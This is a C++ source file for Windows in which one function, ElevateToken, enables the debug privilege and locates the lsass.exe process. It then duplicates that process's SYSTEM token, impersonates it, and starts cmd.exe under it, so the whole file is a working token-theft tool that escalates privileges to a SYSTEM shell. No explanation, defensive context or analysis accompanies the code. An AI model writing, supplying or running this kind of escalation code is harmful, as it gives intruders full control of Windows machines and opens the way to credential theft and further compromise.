#include <Windows.h>
#include <thread>
#include <TlHelp32.h>

#pragma comment(lib, "advapi32.lib")

BOOL ElevateToken() {
    DWORD pid = NULL;
    HANDLE l_processes = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (l_processes != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(processEntry);

        if (Process32FirstW(l_processes, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(l_processes, &processEntry));
        }
        CloseHandle(l_processes);
    }
    if (pid == 0) {
        return FALSE;
    }
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    auto lsassPC = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    HANDLE lsassTK = nullptr;
    if (!OpenProcessToken(lsassPC, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &lsassTK)) {
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    HANDLE lsassDPTK = nullptr;
    if (!DuplicateTokenEx(lsassTK, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &lsassDPTK)) {
        CloseHandle(lsassTK);
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    LUID luid1;
    if (!LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid1)) {
        CloseHandle(lsassDPTK);
        CloseHandle(lsassTK);
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    TOKEN_PRIVILEGES tp1;
    tp1.PrivilegeCount = 1;
    tp1.Privileges[0].Luid = luid1;
    tp1.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(lsassDPTK, FALSE, &tp1, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(lsassDPTK);
        CloseHandle(lsassTK);
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    HANDLE thisThread = GetCurrentThread();
    if (!SetThreadToken(&thisThread, lsassDPTK)) {
        CloseHandle(lsassDPTK);
        CloseHandle(lsassTK);
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    HANDLE lsassPTK = nullptr;
    if (!DuplicateTokenEx(lsassTK, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &lsassPTK)) {
        CloseHandle(lsassDPTK);
        CloseHandle(lsassTK);
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    if (!AdjustTokenPrivileges(lsassPTK, FALSE, &tp1, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(lsassPTK);
        CloseHandle(lsassDPTK);
        CloseHandle(lsassTK);
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    wchar_t cmdLine[] = L"cmd.exe";
    if (!CreateProcessAsUserW(lsassPTK,
        nullptr,
        cmdLine,
        nullptr,
        nullptr,
        FALSE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi)) {
        CloseHandle(lsassPTK);
        CloseHandle(lsassDPTK);
        CloseHandle(lsassTK);
        CloseHandle(lsassPC);
        CloseHandle(hToken);
        return FALSE;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    return TRUE;
}
int main() {
    ElevateToken();
}